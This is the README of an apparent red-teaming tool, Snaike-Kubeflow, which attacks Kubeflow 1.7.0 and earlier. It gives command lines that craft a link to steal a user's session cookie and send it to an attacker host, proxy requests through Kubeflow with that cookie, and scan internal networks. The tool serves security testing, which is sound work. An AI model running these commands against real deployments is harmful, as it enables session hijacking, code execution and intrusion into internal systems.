# Snaike-Kubeflow

Snaike: ProtectAI's Python AI red teaming toolsuite

Kubeflow: Platform for the machine learning lifecycle

Snaike-Kubeflow is a scanner and exploit tool for vulnerabilities in Kubeflow version <=1.7.0 which allows for an attacker to gain access to an authenticated user's cookies, then turn those into remote code execution through Kubeflow's Jupyter notebooks. Additionally, once authenticated, an attacker can use Kubeflow to as a proxy to access internal network servers.

### Installation
```bash
git clone https://github.com/protectai/Snaike-Kubeflow
cd Snaike-Kubeflow
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```
## Usage
### Get user's authentication cookie
Creates a payloaded link to send to a Kubeflow user to steal their authentication cookie
```bash
python3 Kubejack.py --fetch-cookie --attacker-url <attacker_url> --target-url <target_url>
```
Example using BurpSuite's Collaborator link as the attacker's URL: 

`python Kubejack.py --fetch-cookie --attacker-url 8v4lxpiftcnsgj3pchs8tk8mvd14pwtki.oastify.com --kubeflow-url http://kubeflow.company.com`

### Get a URL proxied through Kubeflow
```bash
python Kubejack.py --send-get --get-url <URL to fetch> --path <URL path> --kubeflow-url <URI of Kubeflow> --cookie <authservice_session cookie value>
```
Example:

`python Kubejack.py --send-get --get-url protectai.com --path / --kubeflow-url http://kubeflow.company.com:9999 --cookie MTY4Nzg5NTgyMXxOd3dBTkZKTlRsUkxTMXBSVFRaQldUWlhUMEZXTTFCVFFreElXVWhPUVVoUVJsUkdNa1JWTTBoTFQxcExWVlF5TmxGS1EwaE1XRkU9fDNFMXkwoKlQprr9jJnvuX_osZR9BkyCVJuMcP4kg67v`

### Scan internal network through Kubeflow
```bash
python Kubejack.py --scan --ip-list </path/to/list/of/ips.txt> --cookie <authservice_session cookie> --kubeflow-url <URL of Kubeflow>
```
Example:

`python Kubejack.py --scan --ip-list /tmp/ips.txt --cookie MTY4Nzg5NTgyMXxOd3dBTkZKTlRsUkxTMXBSVFRaQldUWlhUMEZXTTFCVFFreElXVWhPUVVoUVJsUkdNa1JWTTBoTFQxcExWVlF5TmxGS1EwaE1XRkU9fDNFMXkwoKlQprr9jJnvuX_osZR9BkyCVJuMcP4kg67v --kubeflow-url http://kubeflow.company.com:9999`


## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

## License

Copyright 2023 ProtectAI

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
